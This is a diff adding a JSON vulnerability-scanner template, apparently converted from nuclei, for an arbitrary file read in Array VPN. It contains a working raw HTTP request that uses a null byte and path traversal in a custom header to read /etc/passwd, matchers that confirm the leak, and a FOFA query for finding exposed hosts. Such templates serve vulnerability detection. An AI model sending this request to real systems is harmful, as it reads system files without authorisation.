@@ -1,0 +1,161 @@
+{
+  "id": "array-vpn-lfi",
+  "name": "Array VPN - Arbitrary File Reading Vulnerability",
+  "author": "pussycat0x",
+  "severity": "HIGH",
+  "description": "Array VPN Arbitrary File Reading Vulnerability\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/Array%20VPN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "lfi",
+    "vpn",
+    "arrayvpn"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "product\u003d\"Array-VPN\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: zh-CN,zh;q\u003d0.8,en-US;q\u003d0.5,en;q\u003d0.3\nAccept-Encoding: gzip, deflate\nX_AN_FILESHARE: uname\u003dt; password\u003dt; sp_uname\u003dt; flags\u003dc3248;fshare_template\u003d../../../../../../../../etc/passwd\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "/prx/001/http/localh"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "401"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "array-vpn-lfi",
+    "info": {
+      "name": "Array VPN - Arbitrary File Reading Vulnerability",
+      "author": "pussycat0x",
+      "severity": "high",
+      "description": "Array VPN Arbitrary File Reading Vulnerability\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/Array%20VPN%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "product\u003d\"Array-VPN\""
+      },
+      "tags": "lfi,vpn,arrayvpn"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: zh-CN,zh;q\u003d0.8,en-US;q\u003d0.5,en;q\u003d0.3\nAccept-Encoding: gzip, deflate\nX_AN_FILESHARE: uname\u003dt; password\u003dt; sp_uname\u003dt; flags\u003dc3248;fshare_template\u003d../../../../../../../../etc/passwd\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "/prx/001/http/localh"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              401
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
